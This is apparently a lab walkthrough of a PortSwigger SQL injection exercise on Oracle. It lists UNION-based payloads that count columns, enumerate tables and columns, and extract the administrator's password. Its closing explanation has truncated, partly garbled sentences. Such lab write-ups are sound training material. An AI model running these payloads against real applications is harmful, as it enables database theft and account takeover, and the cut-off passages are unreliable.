# Listing the database contents on Oracle database.

**STEP #1**

Determine the number of columns returned by the original query.

```text
' ORDER BY 1--
```

![](./images/cbe08ef121b3_001.png)

```text
' ORDER BY 2--
```

![](./images/cbe08ef121b3_002.png)

```text
' ORDER BY 3--
```

![](./images/cbe08ef121b3_003.png)

```text
' ORDER BY 3--                           → Returns an error message.
```

**Therefore there are 2 columns returned by the original query.**

**STEP #2**

Discover the column that contains the data type string.

**NOTE**

`' UNION SELECT NULL, NULL-- `**returns an error message. Therefore you can make a guess that the database might be Oracle.**

![](./images/cbe08ef121b3_004.png)

```text
' UNION SELECT 'a', NULL FROM DUAL--
```

![](./images/cbe08ef121b3_005.png)

```text
' UNION SELECT NULL, 'a' FROM DUAL--
```

![](./images/cbe08ef121b3_006.png)

```text
' UNION SELECT 'a', NULL FROM DUAL--   →Returns a 200 status code' UNION SELECT NULL, 'a' FROM DUAL--   →Returns a 200 status code
```

Therefore both column 1 and 2 contain that data type string.

**STEP #3**

Determine the table names.

```text
' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--
```

![](./images/cbe08ef121b3_007.png)

Let’s find a table which contains usernames and passwords.

![](./images/cbe08ef121b3_008.png)

Table name: `USERS_KDXGKJ`

**STEP #4**

Determine the column names of the table** **`USERS_KDXGKJ`**.**

```text
' UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_KDXGKJ'--
```

![](./images/cbe08ef121b3_009.png)

**There are two columns in the table **`USERS_KDXGKJ`**.**

`username: USERNAME_CSUMYK`

`password: PASSWORD_AIOQBO`

---

**STEP #5**

Retrieve the administrator user’s password from the database.

```text
' UNION SELECT USERNAME_CSUMYK, PASSWORD_AIOQBO FROM USERS_KDXGKJ--
```

![](./images/cbe08ef121b3_010.png)

|  |  |
|---|---|
| administrator | r1xyd5uo3kcovvqm73jl |

Use the password to get administrators access to the web application.

### Why It Works

The exploit succeeds because this lab contains a sql injection vulnerability in the product category filter. the results from the query are returned in the application's response so you can use a union attack to retrieve data fro

The official solution confirms: Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by t

The root cause is a failure in the application's security architecture specific to this sql injection scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- This lab contains SQL, demonstrating how sql injection vulnerabilities manifest in real applications.
- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab contains a SQL injection vulnerability in the product category filter. The results from the"
- Server-side validation and authorization are the primary defenses.
